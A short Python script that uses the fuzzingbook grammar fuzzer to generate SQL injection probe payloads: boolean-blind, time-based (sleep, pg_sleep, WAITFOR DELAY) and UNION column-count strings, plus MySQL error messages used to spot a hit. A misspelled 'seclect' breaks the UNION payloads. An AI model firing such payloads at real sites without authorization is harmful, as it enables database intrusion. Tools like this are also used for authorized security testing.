import fuzzingbook
from fuzzingbook.Grammars import *

class sqliPayload:
    def __init__(self):
        pass
    
    def error_message(self):
        error_msg = ["You have an error in your SQL syntax", "Warning: mysql_fetch_array()", "sql test"]
        return error_msg

    def generator(self,GRAMMAR):
        return set([simple_grammar_fuzzer(GRAMMAR) for i in range(50)])


    def generator_blind_sql(self):
        SQLI_blind_GRAMMAR = {
            "<start>" : ["<sqli-payload>"],
            "<sqli-payload>" : ["<quote> <condition> <aftercondition><comment>"],
            "<condition>" : ["and", "or"],
            "<aftercondition>" : ["1=1", "1=0",  "dbms_pipe.receive_message(('a'),5)", "WAITFOR DELAY '0:0:5'" , "SELECT pg_sleep(5)", "SELECT sleep(5)"],
            "<quote>" : ["'", "\""],
            "<comment>" : ["-- ", "#", 	"/* "]
        }
        return self.generator(SQLI_blind_GRAMMAR)

    def generator_timebase_sql(self):
        SQLI_timebase_GRAMMAR = {
            "<start>" : ["<sqli-payload>"],
            "<sqli-payload>" : ["<quote> <condition> <aftercondition><comment>"],
            "<condition>" : ["and", "or"],
            "<aftercondition>" : ["dbms_pipe.receive_message(('a'),5)", "WAITFOR DELAY '0:0:5'" , "SELECT pg_sleep(5)", "SELECT sleep(5)"],
            "<quote>" : ["'", "\""],
            "<comment>" : ["-- ", "#", 	"/* "]
        }
        return self.generator(SQLI_timebase_GRAMMAR)


    def generator_union_sql(self):
        sql_union = "<quote> <union> <select> "
        a = ["\"sql test\""]
        payloads = set()
        for i in range(0,9):
            if "<something>" in sql_union:
                sql_union = sql_union + ",<something>"
            else:
                sql_union = sql_union + "<something>"


            SQLI_union_GRAMMAR = {
                "<start>" : ["<sqli-payload>"],
                "<sqli-payload>" : [ sql_union+"<comment>"],
                "<condition>" : ["and", "or"],
                "<aftercondition>" : ["1=1", "1=0"],
                "<quote>" : ["'", "\""],
                "<union>" : ["union"],
                "<select>" : [ "seclect"],
                "<something>" : a,
                "<comment>" : ["--", "#", ""]
                }
            payloads.update([simple_grammar_fuzzer(SQLI_union_GRAMMAR) for i in range(50)])
        return payloads


a = sqliPayload()

a.generator_union_sql()